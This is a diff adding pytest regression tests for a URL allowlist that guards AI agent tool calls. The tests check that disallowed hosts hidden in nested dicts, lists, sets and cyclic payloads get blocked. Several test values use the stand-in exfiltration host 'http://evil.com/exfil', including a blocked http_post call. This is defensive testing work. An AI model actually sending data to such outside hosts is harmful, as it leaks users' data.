@@ -110,6 +110,57 @@ class TestURLAllowListIgnoresNonURLs:
         """Non-string arguments are passed through untouched."""
         assert url_allowlist(value) is None
 
+    def test_blocks_url_hidden_in_dict_value(self, url_allowlist: URLAllowList):
+        """The regression this class exists for: a URL inside a payload dict."""
+        violation = url_allowlist({"redirect": "http://evil.com"})
+        assert violation is not None
+        assert "not in allowlist" in violation.reason
+
+    def test_blocks_url_hidden_in_dict_key(self, url_allowlist: URLAllowList):
+        """Keys carry URLs too, e.g. an endpoint map."""
+        violation = url_allowlist({"http://evil.com": "data"})
+        assert violation is not None
+        assert "not in allowlist" in violation.reason
+
+    def test_blocks_url_hidden_in_nested_dict(self, url_allowlist: URLAllowList):
+        """Nesting depth doesn't matter."""
+        data = {"config": {"webhooks": [{"callback": "http://evil.com/exfil"}]}}
+        violation = url_allowlist(data)
+        assert violation is not None
+        assert "not in allowlist" in violation.reason
+
+    @pytest.mark.parametrize(
+        "container",
+        [
+            ["http://evil.com"],
+            ("http://evil.com",),
+            {"http://evil.com"},
+            frozenset({"http://evil.com"}),
+            [{"a": ["http://evil.com"]}],
+        ],
+    )
+    def test_blocks_url_in_any_container(self, url_allowlist: URLAllowList, container):
+        """Lists, tuples, sets and frozensets are all walked."""
+        assert url_allowlist(container) is not None
+
+    def test_allows_allowlisted_url_inside_a_container(self, url_allowlist: URLAllowList):
+        """Recursion must not turn permitted URLs into violations."""
+        assert url_allowlist({"callback": "https://api.internal.com/hook"}) is None
+
+    def test_allows_container_of_non_url_values(self, url_allowlist: URLAllowList):
+        """A benign payload stays benign -- this is the 0.3.2 regression guard."""
+        assert url_allowlist({"user": "bob", "retries": 3, "note": "hello world"}) is None
+
+    def test_survives_a_self_referential_container(self, url_allowlist: URLAllowList):
+        """A cyclic argument must not hang the guard."""
+        data: dict = {"name": "loop"}
+        data["self"] = data
+        assert url_allowlist(data) is None
+
+        evil: dict = {"redirect": "http://evil.com"}
+        evil["self"] = evil
+        assert url_allowlist(evil) is not None
+
     def test_guards_a_multi_argument_tool(self, url_allowlist: URLAllowList):
         """The regression that motivated this: http_post(url, body, timeout)."""
         from modelfuzz import ModelFuzzBlockError, PolicyEngine, shield_tool
@@ -131,6 +182,19 @@ class TestURLAllowListIgnoresNonURLs:
         # A disallowed host is still blocked.
         with pytest.raises(ModelFuzzBlockError):
             http_post("http://evil.com/exfil", "hello world")
+
+        # And a disallowed host hidden in a structured payload is blocked too.
+        with pytest.raises(ModelFuzzBlockError):
+            http_post(
+                "https://api.internal.com/v1",
+                {"redirect": "http://evil.com"},
+                timeout=3,
+            )
+
+        # A structured payload with no URLs in it still passes.
+        assert http_post("https://api.internal.com/v1", {"user": "bob"}, timeout=3) == (
+            "posted to https://api.internal.com/v1"
+        )
 
 
 class TestSensitiveDataFilter:
